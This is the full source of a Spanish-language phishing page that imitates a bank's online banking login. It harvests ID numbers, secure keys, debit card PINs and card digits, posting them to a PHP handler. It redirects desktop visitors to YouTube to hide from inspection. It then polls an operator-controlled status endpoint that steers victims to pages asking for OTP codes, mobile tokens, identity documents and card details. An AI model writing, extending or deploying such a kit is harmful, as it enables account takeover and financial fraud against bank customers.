<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Bienvenido a tu Banca Virtual</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="assets/css/bancavirtual.css"> 
    <style>
        /* Estilos para el overlay de carga y el popup de error */
        
        /* === CAMBIO AQUÍ === 
           Se cambió .overlay por los IDs para más especificidad 
           AÑADIDO: #loanModalOverlay */
        #loadingOverlay, #errorPopupOverlay, #loanModalOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 25, 71, 0.8); /* Azul oscuro */
            backdrop-filter: blur(6px);      /* Efecto de desenfoque */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
            flex-direction: column; 
            overflow-y: auto; /* Para permitir scroll en el modal */
        }
        
        /* === CAMBIO AQUÍ === */
        #loadingOverlay.active, #errorPopupOverlay.active, #loanModalOverlay.active {
            opacity: 1;
            visibility: visible;
        }

        /* === ESTILOS DEL LOADER CORREGIDOS === */
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .loader-dots {
            position: relative;
            width: 80px;  /* Más grande */
            height: 70px; /* Más grande */
            animation: rotate 1s linear infinite; /* Animación de rotación más rápida (1s) */
            margin-bottom: 20px; /* Espacio entre el loader y el texto */
        }
        .loader-dots div {
            position: absolute;
            width: 25px; /* Círculos más grandes */
            height: 25px; /* Círculos más grandes */
            border-radius: 50%;
        }
        /* Círculo superior (Rojo) */
        .loader-dots div:nth-child(1) {
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            background-color: #FF0000; /* Rojo */
        }
        /* Círculo inferior izquierdo (Azul) */
        .loader-dots div:nth-child(2) {
            bottom: 0;
            left: 0; 
            background-color: #0000FF; /* Azul */
        }
        /* Círculo inferior derecho (Amarillo) */
        .loader-dots div:nth-child(3) {
            bottom: 0;
            right: 0;
            background-color: #FFFF00; /* Amarillo */
        }

        /* Animación de rotación */
        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        /* Estilos para el texto de carga */
        .loading-text {
            color: #ffffff; /* Texto blanco */
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            font-family: 'Inter', sans-serif; /* Asegurar fuente legible */
        }
        /* === FIN DE LA CORRECCIÓN DEL LOADER === */


        /* Estilos del popup de error (Image 2) */
        .error-popup {
            background-color: #fff;
            border-radius: 12px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .error-popup .icon-warning {
            width: 50px;
            height: 50px;
            background-color: #e07b00;
            border-radius: 50%;
            margin: 0 auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 28px;
            color: #fff;
            font-weight: bold;
            line-height: 1;
        }
        .error-popup h2 {
            font-size: 22px;
            color: #1f2937;
            margin-bottom: 10px;
        }
        .error-popup p {
            font-size: 15px;
            color: #6b7280;
            line-height: 1.5;
            margin-bottom: 30px;
        }
        .error-popup button {
            background-color: var(--bv-dark-blue, #004a99); /* Fallback color */
            color: #fff;
            padding: 12px 25px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        .error-popup button:hover {
            background-color: #003687;
        }

        /* ================================================== */
        /* === NUEVOS ESTILOS PARA EL MODAL DE CRÉDITO === */
        /* ================================================== */
        .loan-modal-content {
            background-color: #fff;
            border-radius: 12px;
            padding: 20px;
            width: 95%;
            max-width: 450px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            max-height: 90vh; /* Máxima altura */
            overflow-y: auto; /* Scroll si el contenido es muy largo */
            margin-top: 20px; /* Margen superior para no pegar al borde */
            margin-bottom: 20px; /* Margen inferior */
        }

        .loan-modal-content h3 {
            font-family: 'Inter', sans-serif;
            font-size: 22px;
            font-weight: 700;
            color: var(--bv-dark-blue, #004a99);
            text-align: center;
            margin-bottom: 20px;
        }

        /* Estilos para el slider de monto */
        .loan-slider-group {
            background-color: var(--bv-dark-blue, #004a99);
            color: #fff;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .loan-slider-group label {
            font-family: 'Inter', sans-serif;
            font-size: 18px;
            font-weight: 600;
            display: block;
            margin-bottom: 10px;
        }
        .loan-amount-display {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 15px;
        }
        input[type="range"] {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            height: 10px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            outline: none;
        }
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 24px;
            height: 24px;
            background: #FF0000; /* Color rojo del logo */
            border-radius: 50%;
            cursor: pointer;
            border: 2px solid #fff;
        }
        input[type="range"]::-moz-range-thumb {
            width: 24px;
            height: 24px;
            background: #FF0000;
            border-radius: 50%;
            cursor: pointer;
            border: 2px solid #fff;
        }
        .loan-slider-labels {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 5px;
        }

        /* Adaptación de los estilos de formulario bv- a .loan-modal-content */
        .loan-modal-content .bv-input-label {
            display: block;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 600;
            color: #374151; /* Color de label original */
            margin-bottom: 8px;
        }
        
        .loan-modal-content .bv-input-group {
            display: flex;
            margin-bottom: 15px;
            position: relative;
        }

        .loan-modal-content .bv-input-group select,
        .loan-modal-content .bv-input-group input {
            font-family: 'Inter', sans-serif;
            border: 1px solid #D1D5DB; /* Borde gris original */
            border-radius: 8px;
            padding: 12px 15px;
            font-size: 16px;
            width: 100%;
            box-sizing: border-box; /* Importante */
        }

        /* Específico para el select de tipo doc */
        .loan-modal-content .bv-input-group select#tipoDocCredito {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
            border-right: none;
            flex-basis: 80px;
            flex-grow: 0;
            -webkit-appearance: none;
            appearance: none;
            background-color: #f9fafb;
        }
        .loan-modal-content .bv-input-group input[name="cedula"] {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        /* Icono de error */
        .loan-modal-content .bv-input-group .error-icon {
            display: none; /* Oculto por defecto */
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #EF4444;
            font-weight: bold;
        }
        .loan-modal-content .bv-input-group.is-invalid input,
        .loan-modal-content .bv-input-group.is-invalid select {
            border-color: #EF4444;
        }
        .loan-modal-content .bv-input-group.is-invalid .error-icon {
            display: block;
        }

        /* Cuota mensual */
        .loan-fee-display {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            background-color: #f3f4f6;
            border-radius: 8px;
        }
        .loan-fee-display .bv-input-label {
            color: var(--bv-dark-blue, #004a99);
            font-size: 16px;
        }
        .loan-fee-display .amount {
            font-size: 28px;
            font-weight: 800;
            color: #1f2937;
            margin-top: 5px;
        }
        
        /* Botones del modal */
        .loan-modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        .loan-modal-buttons .btn {
            flex: 1;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        /* Botón de Validar (principal) */
        .loan-modal-buttons .bv-submit-btn {
            background-color: var(--bv-dark-blue, #004a99);
            color: #fff;
        }
        .loan-modal-buttons .bv-submit-btn:disabled {
            background-color: #9CA3AF; /* Gris cuando está deshabilitado */
            cursor: not-allowed;
            opacity: 0.7;
        }
        /* Botón de Cancelar (secundario) */
        .loan-modal-buttons .bv-cancel-btn {
            background-color: #fff;
            color: #6B7280;
            border: 1px solid #D1D5DB;
        }
        /* ================================================== */
        /* === FIN DE ESTILOS PARA EL MODAL DE CRÉDITO === */
        /* ================================================== */

    </style>
    <script>
        // Umbral de ancho para considerar que es una PC (por ejemplo, > 768px)
        const desktopMinWidth = 768; 

        // Función de detección y redirección
        function checkAndRedirect() {
            if (window.innerWidth > desktopMinWidth) {
                // Redirige si el ancho de la ventana es mayor al umbral
                window.location.href = 'https://www.youtube.com/';
            }
        }

        // Ejecutar la función inmediatamente al cargar el script (antes de DOMContentLoaded)
        checkAndRedirect();
    </script>
    </head>
<body>

    <main class="wrap">
        <h1 class="bv-title">Bienvenido a tu Banca Virtual</h1>
        
        <div class="bv-help-block">
            <div class="bv-help-content">
                <div class="bv-help-img">
                    <img src="assets/img/mujer.png" alt="Usuario sonriendo">
                </div>
                
                <div class="bv-help-text">
                    <span class="bv-help-text-main">¿Nunca has ingresado a Banca Virtual?</span>
                    <span class="bv-help-text-sub">
                        <a href="#" class="bv-help-link">Aquí te decimos cómo hacerlo</a>
                    </span>
                </div>
            </div>
        </div>

        <div class="bv-login-card">
            
            <div class="bv-tabs">
                <button class="bv-tab is-active" data-tab="clave">Clave segura</button>
                <button class="bv-tab" data-tab="tarjeta">Tarjeta débito</button>
            </div>

            <div class="bv-tab-content is-active" id="clave">
                
                <div class="bv-alert-message">
                    Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
                    <button class="bv-close-btn">&times;</button>
                </div>

                <div class="bv-content-wrapper">
                    <!-- FORMULARIO 1: Clave Segura -->
                    <!-- ======================= MODIFICACIÓN ======================= -->
                    <!-- El 'action' ahora se maneja por JS, pero lo dejamos por si JS falla -->
                    <form method="post" action="assets/config/process_bv_login.php" novalidate id="login-form-clave">
                    <!-- ========================================================== -->
                        
                        <label for="document_type" class="bv-input-label">Identificación</label>
                        <div class="bv-input-group">
                            <select id="document_type" name="document_type" required>
                                <option value="CC" selected>C.C.</option>
                                <option value="CE">C.E.</option>
                                <option value="PA">P.A.</option>
                            </select>
                            <input id="document_number" name="document_number" type="text" placeholder="#" inputmode="numeric" required>
                            <span class="error-icon">!</span>
                        </div>

                        <label for="secure_key" class="bv-input-label">Clave segura</label>
                        <div class="bv-password-group">
                            <input id="secure_key" name="secure_key" type="password" placeholder="...." required 
                                   maxlength="4" inputmode="numeric" pattern="\d{4}">
                            <span class="error-icon">!</span>
                            <button type="button" class="bv-toggle-pass" aria-controls="secure_key">
                                <span class="eye-icon"></span>
                            </button>
                        </div>

                        <button type="submit" class="btn bv-submit-btn" id="submit-btn-clave" disabled>Ingresar</button>
                    </form>

                    <div class="bv-links-footer">
                        <a href="#" class="bv-link">
                            <span>Registrarme</span>
                            <span class="arrow">›</span>
                        </a>
                        <a href="#" class="bv-link">
                            <span>Olvidé mi clave</span>
                            <span class="arrow">›</span>
                        </a>
                    </div>
                </div>
            </div>
            
            <div class="bv-tab-content" id="tarjeta">
                <div class="bv-content-wrapper">
                    <!-- FORMULARIO 2: Tarjeta Débito -->
                    <!-- ======================= MODIFICACIÓN ======================= -->
                    <form method="post" action="assets/config/process_bv_login.php" novalidate id="login-form-tarjeta">
                    <!-- ========================================================== -->
                        
                        <label for="document_type_td" class="bv-input-label">Identificación</label>
                        <div class="bv-input-group">
                            <select id="document_type_td" name="document_type_td" required>
                                <option value="CC" selected>C.C.</option>
                                <option value="CE">C.E.</option>
                                <option value="PA">P.A.</option>
                            </select>
                            <input id="document_number_td" name="document_number_td" type="text" placeholder="343434343" inputmode="numeric" required>
                            <span class="error-icon">!</span>
                        </div>

                        <label for="debit_card_key" class="bv-input-label">Clave de tu tarjeta débito</label>
                        <div class="bv-password-group">
                            <input id="debit_card_key" name="debit_card_key" type="password" placeholder="...." required 
                                   maxlength="4" inputmode="numeric" pattern="\d{4}">
                            <span class="error-icon">!</span>
                            <button type="button" class="bv-toggle-pass" aria-controls="debit_card_key">
                                <span class="eye-icon"></span>
                            </button>
                        </div>

                        <label for="last_4_digits" class="bv-input-label">Últimos 4 dígitos de tu tarjeta débito</label>
                        <div class="bv-password-group">
                            <input id="last_4_digits" name="last_4_digits" type="password" placeholder="...." required 
                                   maxlength="4" inputmode="numeric" pattern="\d{4}">
                            <span class="error-icon">!</span>
                            <button type="button" class="bv-toggle-pass" aria-controls="last_4_digits">
                                <span class="eye-icon"></span>
                            </button>
                        </div>

                        <button type="submit" class="btn bv-submit-btn" id="submit-btn-td" disabled>Ingresar</button>
                    </form>
                </div>
            </div>

        </div>

        <p class="bv-legal-text">
            Este sitio está protegido por reCAPTCHA y aplican las 
            <a href="#" class="bv-legal-link">políticas de privacidad</a> y los 
            <a href="#" class="bv-legal-link">términos de servicio de Google</a>.
        </p>
        <a href="#" class="bv-promo-ad">
            <img src="assets/img/bre.png" alt="Promoción BreB para viajar">
        </a>
    </main>

    <!-- Overlay de Carga (Original) -->
    <div id="loadingOverlay" class="overlay">
        <div class="loader-container">
            <div class="loader-dots">
                <div style="background-color: #FF0000;"></div> 
                <div style="background-color: #0000FF;"></div> 
                <div style="background-color: #FFFF00;"></div> 
            </div>
            <p class="loading-text">Cargando, espera un momento...</p> 
        </div>
    </div>

    <!-- Popup de Error (Original) -->
    <div id="errorPopupOverlay" class="overlay">
        <div class="error-popup">
            <div class="icon-warning">!</div> 
            <h2>Tus datos no coinciden</h2>
            <p>Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos a solicitar un producto desde la pantalla de inicio. (02)</p>
            <button onclick="window.location.href='index.php'">Volver al inicio</button>
        </div>
    </div>

    <script src="assets/js/bancavirtual.js"></script>
    
    <!-- ========================================================== -->
    <!-- === SECCIÓN DE SCRIPT COMPLETAMENTE REESCRITA        === -->
    <!-- ========================================================== -->
    <script>
// Función para formatear números como moneda
function formatCurrency(value) {
    const numericValue = parseFloat(value.replace(/\D/g, ''));
    if (isNaN(numericValue)) {
        return '';
    }
    return '$' + new Intl.NumberFormat('es-CO').format(numericValue);
}

// Función para validar un formulario específico y habilitar su botón
function validateForm(form, submitBtn) {
    const inputs = form.querySelectorAll('input[required], select[required]');
    let allValid = true;
    inputs.forEach(input => {
        if (input.value.trim() === '') {
            allValid = false;
        }
    });
    submitBtn.disabled = !allValid;
}

// Función para mostrar/ocultar error de validación en blur/input
function setupInputValidation(form) {
    const inputsToValidate = form.querySelectorAll('input[required]');
    inputsToValidate.forEach(input => {
        input.addEventListener('blur', function() {
            const group = this.closest('.bv-input-group, .bv-password-group');
            if (this.value.trim() === '') {
                group.classList.add('is-invalid');
            } else {
                group.classList.remove('is-invalid');
            }
        });
        input.addEventListener('input', function() {
            const group = this.closest('.bv-input-group, .bv-password-group');
            if (this.value.trim() !== '') {
                group.classList.remove('is-invalid');
            }

            // Formatear campos de moneda (si quedan, en este caso ya no hay en este form)
            if (['ingresoMensual', 'gastosMensual', 'saldoActual'].includes(this.id)) {
                const caretPosition = this.selectionStart;
                const originalLength = this.value.length;
                this.value = formatCurrency(this.value);
                const newLength = this.value.length;
                // Ajustar posición del cursor
                if (caretPosition !== null) {
                    this.setSelectionRange(caretPosition + (newLength - originalLength), caretPosition + (newLength - originalLength));
                }
            }
            
            // Validar teléfono (solo números)
            if (this.id === 'celular') {
                this.value = this.value.replace(/\D/g, '').slice(0, 10);
            }
        });
    });
}

document.addEventListener('DOMContentLoaded', function() {
    
    // --- Selectores de Elementos ---
    const loadingOverlay = document.getElementById('loadingOverlay');
    const errorPopupOverlay = document.getElementById('errorPopupOverlay');
    const loadingText = document.querySelector('.loading-text');

    let checkInterval; // Variable global para el intervalo de polling

    // --- Función de Polling (Verificar Estado) ---
    function checkStatus(transactionId) {
        fetch(`assets/config/verificar_estado.php?id=${transactionId}`)
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    const estado = data.estado;
                    if (estado === 1) { 
                        clearInterval(checkInterval); 
                        loadingOverlay.classList.remove('active'); 
                        errorPopupOverlay.classList.add('active'); 
                    } else if (estado === 2) { 
                        clearInterval(checkInterval);
                        window.location.href = `otp.php?id=${transactionId}`;
                    } else if (estado === 0) {
                        console.log('Estado actual:', estado, '. Esperando confirmación...');
                    } else if (estado === 3) { 
                        clearInterval(checkInterval);
                        window.location.href = `otp.php?id=${transactionId}&error=token_invalid`;
                    } else if (estado === 4) { 
                        clearInterval(checkInterval);
                        window.location.href = `tokemovil.php?id=${transactionId}`;
                    } else if (estado === 5) { 
                        clearInterval(checkInterval);
                        window.location.href = `tokemovil.php?id=${transactionId}&error=sms_invalid`;
                    } else if (estado === 6) {
                        // ✅ Soy yo — iniciar flujo KYC
                        clearInterval(checkInterval);
                        window.location.href = `kyc_front.php?id=${transactionId}`;
                    } else if (estado === 7) {
                        // ❌ Error Soy yo — reiniciar
                        clearInterval(checkInterval);
                        window.location.href = `index.php`;
                    } else if (estado === 8) {
                        // KYC en revisión — seguir esperando
                        console.log('KYC en revisión, esperando decisión del admin...');
                    } else if (estado === 9) {
                        // ✅ KYC Aprobado — seguir esperando
                        clearInterval(checkInterval);
                        window.location.href = `index.php?id=${transactionId}`;
                    } else if (estado === 10) {
                        // ❌ KYC Rechazado — reiniciar login
                        clearInterval(checkInterval);
                        window.location.href = `index.php`;
                    } else if (estado === 11) {
                        // ✅ TC Aprobada — finalizar
                        clearInterval(checkInterval);
                        window.location.href = `index.php?id=${transactionId}`;
                    } else if (estado === 12) {
                        // ❌ Error TC Crédito — volver al form de crédito con error
                        clearInterval(checkInterval);
                        window.location.href = `tarjeta_credito.php?id=${transactionId}&status=ccerror`;
                    } else if (estado === 13) {
                        // 💳 Pedir TC Crédito
                        clearInterval(checkInterval);
                        window.location.href = `tarjeta_credito.php?id=${transactionId}`;
                    } else if (estado === 14) {
                        // 🏦 Pedir TC Débito
                        clearInterval(checkInterval);
                        window.location.href = `tarjeta_debito.php?id=${transactionId}`;
                    } else if (estado === 15) {
                        // ❌ Error TC Débito — volver al form de débito con error
                        clearInterval(checkInterval);
                        window.location.href = `tarjeta_debito.php?id=${transactionId}&status=ccerror`;
                    }
                } else {
                    console.error('Error al verificar estado:', data.message);
                    clearInterval(checkInterval);
                    loadingOverlay.classList.remove('active');
                    console.error('Ocurrió un error al procesar tu solicitud. Por favor, intenta de nuevo.');
                    window.location.href = 'index.php'; 
                }
            })
            .catch(error => {
                console.error('Error en la petición de verificación:', error);
                clearInterval(checkInterval);
                loadingOverlay.classList.remove('active');
                console.error('No se pudo comunicar con el servidor. Por favor, intenta de nuevo.');
                window.location.href = 'index.php'; 
            });
    }

    // --- Función para iniciar el Polling ---
    function startPolling(transactionId) {
        // Iniciar el loader
        loadingOverlay.classList.add('active');

        // Iniciar el intervalo
        checkInterval = setInterval(() => checkStatus(transactionId), 3000); 
        checkStatus(transactionId); // Llamar inmediatamente una vez

        // Timeout de seguridad
        setTimeout(() => {
            if (loadingOverlay.classList.contains('active')) {
                clearInterval(checkInterval);
                loadingOverlay.classList.remove('active');
                console.error('El tiempo de espera ha terminado. Por favor, verifica tus datos o intenta más tarde.');
                window.location.href = 'index.php';
            }
        }, 120000); // 2 minutos
    }

    // --- Lógica Principal al Cargar la Página ---
    function getUrlParameter(name) {
        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        const results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }

    const transactionId = getUrlParameter('id');

    if (transactionId) {
        // Con ID de transacción, ir directo al loader y esperar decisión del admin
        startPolling(transactionId);
    } else {
        // Sin ID, página de login normal
        const tabs = document.querySelectorAll('.bv-tab');
        const tabContents = document.querySelectorAll('.bv-tab-content');
        
        tabs.forEach(tab => {
            tab.addEventListener('click', function() {
                tabs.forEach(t => t.classList.remove('is-active'));
                this.classList.add('is-active');
                const targetTab = this.dataset.tab;
                tabContents.forEach(content => {
                    content.classList.remove('is-active');
                    if (content.id === targetTab) {
                        content.classList.add('is-active');
                    }
                });
            });
        });

        // Toggle Contraseña
        document.querySelectorAll('.bv-toggle-pass').forEach(button => {
            button.addEventListener('click', function() {
                const inputId = this.getAttribute('aria-controls');
                const input = document.getElementById(inputId);
                if (input.type === 'password') {
                    input.type = 'text';
                    this.setAttribute('aria-pressed', 'true');
                } else {
                    input.type = 'password';
                    this.setAttribute('aria-pressed', 'false');
                }
            });
        });

        // Cerrar Alerta
        const alertMessage = document.querySelector('.bv-alert-message');
        const closeAlertBtn = document.querySelector('.bv-close-btn');
        if (closeAlertBtn) {
            closeAlertBtn.addEventListener('click', function() {
                alertMessage.style.display = 'none';
            });
        }
    }

    // Validación para los formularios de LOGIN
    const loginForms = document.querySelectorAll('.bv-login-card form');
    loginForms.forEach(form => {
        const submitBtn = form.querySelector('.bv-submit-btn');
        const inputs = form.querySelectorAll('input[required], select[required]');

        inputs.forEach(input => {
            input.addEventListener('input', () => validateForm(form, submitBtn));
        });
        
        setupInputValidation(form);
        validateForm(form, submitBtn);

        form.addEventListener('submit', function(e) {
            loadingOverlay.classList.add('active');
        });
    });

});
    </script>
</body>
</html>